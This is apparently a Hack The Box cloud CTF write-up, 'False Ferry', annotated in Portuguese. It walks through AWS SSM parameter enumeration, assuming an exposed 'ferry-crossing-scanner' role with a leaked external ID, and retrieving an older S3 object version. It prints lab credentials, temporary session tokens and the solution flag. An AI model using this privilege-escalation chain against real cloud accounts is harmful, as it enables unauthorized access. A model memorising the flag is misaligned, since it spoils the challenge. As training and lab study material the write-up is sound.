## Resolvido por Doz

### Lore: 

**Initial letters:**

Stormbound Coalition
# False Ferry

Lysa Harrowmere reaches the lower city ferry piers while Stormbound soldiers wait for the morning boat. They are supposed to cross the river and guard the east road before Vaultrune's next patrol moves through. The route board says the boat goes to the east road landing, but the crew roster sends it to a dock controlled by Vaultrune. If Lysa warns the soldiers openly, Vaultrune's men can claim she started a fight at the pier. If she confronts the ferry master, his guards can tear down the roster and post the correct one. Lysa has one job: find the earlier crossing list, prove who changed the dock, and get the soldiers onto the right boat before Vaultrune cuts the road.

You hold Stormbound Coalition ferry clerk access. Crossing batch metadata lives in Systems Manager under `/ferry/crossing/`. Catalog the namespace before you read any parameter value.

---

Sealed Writ

Starting credentials
Credentials loaded

IAM user : coalition-ferry-clerk
Access key ID : AKIA36ARSCG8LC1GOZYF
Secret access key : dKsytpgaQMI16S//N37BWR11htuUv+J8dTCdlMPG
Region : us-east-1

---

Clerk's Margin

AWS CLI
Point AWS_ENDPOINT_URL at the instance IP and the AWS API port from your instance card, not the briefing port in the address bar.

Shell setup
```bash
export AWS_ENDPOINT_URL=http://154.57.164.76:32465
export AWS_DEFAULT_REGION=us-east-1
export AWS_ACCESS_KEY_ID=AKIA36ARSCG8LC1GOZYF
export AWS_SECRET_ACCESS_KEY=dKsytpgaQMI16S//N37BWR11htuUv+J8dTCdlMPG
unset AWS_SESSION_TOKEN
```

Install AWS CLI v2, then confirm the session. Flag format: HTB{...}.

```bash
aws sts get-caller-identity
```

url web: http://154.57.164.76:31740/
url aws: http://154.57.164.76:32465/


```bash
aws ssm describe-parameters
{
    "Parameters": [
        {
            "Name": "/ferry/crossing/live-crossing-id",
            "Type": "String",
            "LastModifiedDate": "2026-07-25T02:30:04.013000-03:00",
            "Version": 1,
            "DataType": "text"
        },
        {
            "Name": "/ferry/crossing/CROSSING-VOID-9B11",
            "Type": "String",
            "LastModifiedDate": "2026-07-25T02:30:04.101000-03:00",
            "Version": 1,
            "DataType": "text"
        },
        {
            "Name": "/ferry/crossing/CROSSING-CLOSED-5E22",
            "Type": "String",
            "LastModifiedDate": "2026-07-25T02:30:04.194000-03:00",
            "Version": 1,
            "DataType": "text"
        },
        {
            "Name": "/ferry/crossing/CROSSING-DRAFT-8D40",
            "Type": "String",
            "LastModifiedDate": "2026-07-25T02:30:04.205000-03:00",
            "Version": 1,
            "DataType": "text"
        },
        {
            "Name": "/ferry/crossing/CROSSING-VOID-3C21",
            "Type": "String",
            "LastModifiedDate": "2026-07-25T02:30:04.110000-03:00",
            "Version": 1,
            "DataType": "text"
        },
        {
            "Name": "/ferry/crossing/CROSSING-7A3F",
            "Type": "String",
            "LastModifiedDate": "2026-07-25T02:30:04.074000-03:00",
            "Version": 1,
            "DataType": "text"
        },
        {
            "Name": "/ferry/crossing/CROSSING-VOID-1A04",
            "Type": "String",
            "LastModifiedDate": "2026-07-25T02:30:04.163000-03:00",
            "Version": 1,
            "DataType": "text"
        },
        {
            "Name": "/ferry/crossing/CROSSING-VOID-2D77",
            "Type": "String",
            "LastModifiedDate": "2026-07-25T02:30:04.260000-03:00",
            "Version": 1,
            "DataType": "text"
        }
    ]
}

aws ssm get-parameter --name "/ferry/crossing/live-crossing-id" --with-decryption
{
    "Parameter": {
        "Name": "/ferry/crossing/live-crossing-id",
        "Type": "String",
        "Value": "CROSSING-7A3F",
        "Version": 1,
        "LastModifiedDate": "2026-07-25T02:30:04.013000-03:00",
        "ARN": "arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/live-crossing-id",
        "DataType": "text"
    }
}

aws ssm get-parameter --name "/ferry/crossing/CROSSING-7A3F" --with-decryption
{
    "Parameter": {
        "Name": "/ferry/crossing/CROSSING-7A3F",
        "Type": "String",
        "Value": "{\n  \"crossing_id\": \"CROSSING-7A3F\",\n  \"status\": \"AUTHORIZED\",\n  \"issuer\": \"stormbound-coalition-ferry-office\",\n  \"scanner_role_arn\": \"arn:aws:iam::584729103648:role/ferry-crossing-scanner\",\n  \"scanner_external_id\": \"ferry-crossing-scanner-7a3f\",\n  \"manifest_bucket\": \"ferry-crossing-manifest\",\n  \"manifest_object_key\": \"manifests/morning-crossing-order.txt\",\n  \"manifest_version_id\": \"4f223257-1a7c-4071-8d5a-90086beba1d9\",\n  \"record_type\": \"crossing_manifest\"\n}",
        "Version": 1,
        "LastModifiedDate": "2026-07-25T02:30:04.074000-03:00",
        "ARN": "arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/CROSSING-7A3F",
        "DataType": "text"
    }
}

aws ssm get-parameter --name "/ferry/crossing/CROSSING-CLOSED-5E22" --with-decryption
{
    "Parameter": {
        "Name": "/ferry/crossing/CROSSING-CLOSED-5E22",
        "Type": "String",
        "Value": "{\n  \"crossing_id\": \"CROSSING-CLOSED-5E22\",\n  \"status\": \"CLOSED\",\n  \"issuer\": \"third-party-archive\",\n  \"scanner_external_id\": \"sb-ferry-audit-2025-08912\",\n  \"manifest_bucket\": \"ferry-crossing-manifest\",\n  \"manifest_object_key\": \"manifests/autumn-crossing-closeout.txt\",\n  \"record_type\": \"crossing_manifest\"\n}",
        "Version": 1,
        "LastModifiedDate": "2026-07-25T02:30:04.194000-03:00",
        "ARN": "arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/CROSSING-CLOSED-5E22",
        "DataType": "text"
    }
}

aws ssm get-parameter --name "/ferry/crossing/CROSSING-DRAFT-8D40" --with-decryption
{
    "Parameter": {
        "Name": "/ferry/crossing/CROSSING-DRAFT-8D40",
        "Type": "String",
        "Value": "{\n  \"crossing_id\": \"CROSSING-DRAFT-8D40\",\n  \"status\": \"DRAFT\",\n  \"issuer\": \"third-party-archive\",\n  \"scanner_external_id\": \"sb-ferry-audit-2026-00987\",\n  \"manifest_bucket\": \"ferry-crossing-manifest\",\n  \"manifest_object_key\": \"manifests/morning-crossing-order-draft.txt\",\n  \"record_type\": \"crossing_manifest\"\n}",
        "Version": 1,
        "LastModifiedDate": "2026-07-25T02:30:04.205000-03:00",
        "ARN": "arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/CROSSING-DRAFT-8D40",
        "DataType": "text"
    }
}

aws ssm get-parameter --name "/ferry/crossing/CROSSING-VOID-3C21" --with-decryption
{
    "Parameter": {
        "Name": "/ferry/crossing/CROSSING-VOID-3C21",
        "Type": "String",
        "Value": "{\n  \"crossing_id\": \"CROSSING-VOID-3C21\",\n  \"status\": \"VOID\",\n  \"issuer\": \"third-party-archive\",\n  \"scanner_external_id\": \"sb-ferry-audit-2025-03318\",\n  \"manifest_bucket\": \"ferry-crossing-manifest\",\n  \"manifest_object_key\": \"manifests/archived/crossing-draft.txt\",\n  \"record_type\": \"crossing_manifest\"\n}",
        "Version": 1,
        "LastModifiedDate": "2026-07-25T02:30:04.110000-03:00",
        "ARN": "arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/CROSSING-VOID-3C21",
        "DataType": "text"
    }
}

aws ssm get-parameter --name "/ferry/crossing/CROSSING-VOID-9B11" --with-decryption
{
    "Parameter": {
        "Name": "/ferry/crossing/CROSSING-VOID-9B11",
        "Type": "String",
        "Value": "{\n  \"crossing_id\": \"CROSSING-VOID-9B11\",\n  \"status\": \"VOID\",\n  \"issuer\": \"third-party-archive\",\n  \"scanner_external_id\": \"sb-ferry-audit-2025-11004-retired\",\n  \"manifest_bucket\": \"ferry-crossing-manifest\",\n  \"manifest_object_key\": \"manifests/emergency-crossing-draft.txt\",\n  \"record_type\": \"crossing_manifest\",\n  \"manifest_version_id\": \"00000000000000000000000000000000\"\n}",
        "Version": 1,
        "LastModifiedDate": "2026-07-25T02:30:04.101000-03:00",
        "ARN": "arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/CROSSING-VOID-9B11",
        "DataType": "text"
    }
}

aws ssm get-parameter --name "/ferry/crossing/CROSSING-VOID-1A04" --with-decryption
{
    "Parameter": {
        "Name": "/ferry/crossing/CROSSING-VOID-1A04",
        "Type": "String",
        "Value": "{\n  \"crossing_id\": \"CROSSING-VOID-1A04\",\n  \"status\": \"VOID\",\n  \"issuer\": \"third-party-archive\",\n  \"scanner_external_id\": \"sb-ferry-audit-2024-04401\",\n  \"manifest_bucket\": \"ferry-crossing-manifest\",\n  \"manifest_object_key\": \"manifests/archived/crossing-draft.txt\",\n  \"record_type\": \"crossing_manifest\"\n}",
        "Version": 1,
        "LastModifiedDate": "2026-07-25T02:30:04.163000-03:00",
        "ARN": "arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/CROSSING-VOID-1A04",
        "DataType": "text"
    }
}

aws ssm get-parameter --name "/ferry/crossing/CROSSING-VOID-2D77" --with-decryption
{
    "Parameter": {
        "Name": "/ferry/crossing/CROSSING-VOID-2D77",
        "Type": "String",
        "Value": "{\n  \"crossing_id\": \"CROSSING-VOID-2D77\",\n  \"status\": \"VOID\",\n  \"issuer\": \"third-party-archive\",\n  \"scanner_external_id\": \"sb-ferry-audit-2025-07702\",\n  \"manifest_bucket\": \"ferry-crossing-manifest\",\n  \"manifest_object_key\": \"manifests/archived/crossing-draft.txt\",\n  \"record_type\": \"crossing_manifest\"\n}",
        "Version": 1,
        "LastModifiedDate": "2026-07-25T02:30:04.260000-03:00",
        "ARN": "arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/CROSSING-VOID-2D77",
        "DataType": "text"
    }
}

```

```bash
aws sts assume-role --role-arn "arn:aws:iam::584729103648:role/ferry-crossing-scanner" --role-session-name "ferry-scan" --external-id "ferry-crossing-scanner-7a3f"
{
    "Credentials": {
        "AccessKeyId": "ASIASZX052EG4BCN3LU1",
        "SecretAccessKey": "RFWkpCnF82gFo6XCaRYW5wX55JqRyMO8jUKf8iTS",
        "SessionToken": "MulvjoCb8ccO36NMpCQOnGLKy5FigElS7D1UBf1K3bTncqQz2i8lK9oWnf9eNK3mmaWWqXY5VNDnS8gtI8CoEwxUCkUAUJdHi8DqHyLkwEDXzGDRsmN6kc2nzmsdTTMHbCN4KDYxRkS9YwNKA9JBpI77gXyETyRA0xYZCux7bSQluyHZtEZzSAVkOoOSqlhWfIdhLl4G",
        "Expiration": "2026-07-25T06:53:49.057286+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA52RWU0719I822K68:ferry-scan",
        "Arn": "arn:aws:sts::584729103648:assumed-role/ferry-crossing-scanner/ferry-scan"
    },
    "PackedPolicySize": 0
}

```

# Exportar as novas credenciais temporárias
```bash
export AWS_ACCESS_KEY_ID=ASIASZX052EG4BCN3LU1
export AWS_SECRET_ACCESS_KEY=RFWkpCnF82gFo6XCaRYW5wX55JqRyMO8jUKf8iTS
export AWS_SESSION_TOKEN=MulvjoCb8ccO36NMpCQOnGLKy5FigElS7D1UBf1K3bTncqQz2i8lK9oWnf9eNK3mmaWWqXY5VNDnS8gtI8CoEwxUCkUAUJdHi8DqHyLkwEDXzGDRsmN6kc2nzmsdTTMHbCN4KDYxRkS9YwNKA9JBpI77gXyETyRA0xYZCux7bSQluyHZtEZzSAVkOoOSqlhWfIdhLl4G
```

```bash
aws s3api list-object-versions --bucket ferry-crossing-manifest --prefix manifests/morning-crossing-order.txt
{
    "Versions": [
        {
            "ETag": "\"9568150b6166dad6937c9d878f9a0481\"",
            "Size": 129,
            "StorageClass": "STANDARD",
            "Key": "manifests/morning-crossing-order.txt",
            "VersionId": "02118307-8717-4062-a098-8cc20719e473",
            "IsLatest": true,
            "LastModified": "2026-07-25T05:30:03+00:00"
        },
        {
            "ETag": "\"eace9fa6bc64353a0e4e8b4198152d2e\"",
            "Size": 99,
            "StorageClass": "STANDARD",
            "Key": "manifests/morning-crossing-order.txt",
            "VersionId": "d3639ca0-9321-482d-810e-bc834e6ca935",
            "IsLatest": false,
            "LastModified": "2026-07-25T05:30:03+00:00"
        },
        {
            "ETag": "\"446bed33e2f0fa21d9b06af84d02438e\"",
            "Size": 157,
            "StorageClass": "STANDARD",
            "Key": "manifests/morning-crossing-order.txt",
            "VersionId": "4f223257-1a7c-4071-8d5a-90086beba1d9",
            "IsLatest": false,
            "LastModified": "2026-07-25T05:30:03+00:00"
        }
    ],
    "RequestCharged": null,
    "Prefix": "manifests/morning-crossing-order.txt"
}

aws s3api get-object --bucket ferry-crossing-manifest --key manifests/morning-crossing-order.txt --version-id "4f223257-1a7c-4071-8d5a-90086beba1d9" /tmp/current.txt
cat /tmp/current.txt
{
    "AcceptRanges": "bytes",
    "LastModified": "2026-07-25T05:30:03+00:00",
    "ContentLength": 157,
    "ETag": "\"446bed33e2f0fa21d9b06af84d02438e\"",
    "ChecksumCRC32": "LNs/1g==",
    "VersionId": "4f223257-1a7c-4071-8d5a-90086beba1d9",
    "ContentType": "text/plain; charset=utf-8",
    "Metadata": {},
    "StorageClass": "STANDARD"
}
CROSSING RELEASE RECORD
Batch: CROSSING-7A3F
Authorized by: Stormbound Coalition Ferry Office
HTB{ferry_crossing_dock_seal_37e459d15d2caa31e3285d1f5fb67281}

aws s3api list-object-versions --bucket ferry-crossing-manifest --prefix manifests/morning-crossing-order.txt --query 'Versions[*].{VersionId:VersionId,LastModified:LastModified,IsLatest:IsLatest,ETag:ETag}' --output table
-------------------------------------------------------------------------------------------------------------------------
|                                                  ListObjectVersions                                                   |
+-------------------------------------+-----------+----------------------------+----------------------------------------+
|                ETag                 | IsLatest  |       LastModified         |               VersionId                |
+-------------------------------------+-----------+----------------------------+----------------------------------------+
|  "9568150b6166dad6937c9d878f9a0481" |  True     |  2026-07-25T05:30:03+00:00 |  02118307-8717-4062-a098-8cc20719e473  |
|  "eace9fa6bc64353a0e4e8b4198152d2e" |  False    |  2026-07-25T05:30:03+00:00 |  d3639ca0-9321-482d-810e-bc834e6ca935  |
|  "446bed33e2f0fa21d9b06af84d02438e" |  False    |  2026-07-25T05:30:03+00:00 |  4f223257-1a7c-4071-8d5a-90086beba1d9  |
+-------------------------------------+-----------+----------------------------+----------------------------------------+

```


---
**Vuln:**
Escalação de previlegio via miss-config usando assume role de ferry-crossing-scanner exposto no output de: 
```bash
aws ssm get-parameter --name "/ferry/crossing/CROSSING-7A3F" --with-decryption
{
    "Parameter": {
        "Name": "/ferry/crossing/CROSSING-7A3F",
        "Type": "String",
        "Value": "{\n  \"crossing_id\": \"CROSSING-7A3F\",\n  \"status\": \"AUTHORIZED\",\n  \"issuer\": \"stormbound-coalition-ferry-office\",\n  \"scanner_role_arn\": \"arn:aws:iam::584729103648:role/ferry-crossing-scanner\",\n  \"scanner_external_id\": \"ferry-crossing-scanner-7a3f\",\n  \"manifest_bucket\": \"ferry-crossing-manifest\",\n  \"manifest_object_key\": \"manifests/morning-crossing-order.txt\",\n  \"manifest_version_id\": \"4f223257-1a7c-4071-8d5a-90086beba1d9\",\n  \"record_type\": \"crossing_manifest\"\n}",
        "Version": 1,
        "LastModifiedDate": "2026-07-25T02:30:04.074000-03:00",
        "ARN": "arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/CROSSING-7A3F",
        "DataType": "text"
    }
}

```


flag: HTB{ferry_crossing_dock_seal_37e459d15d2caa31e3285d1f5fb67281}
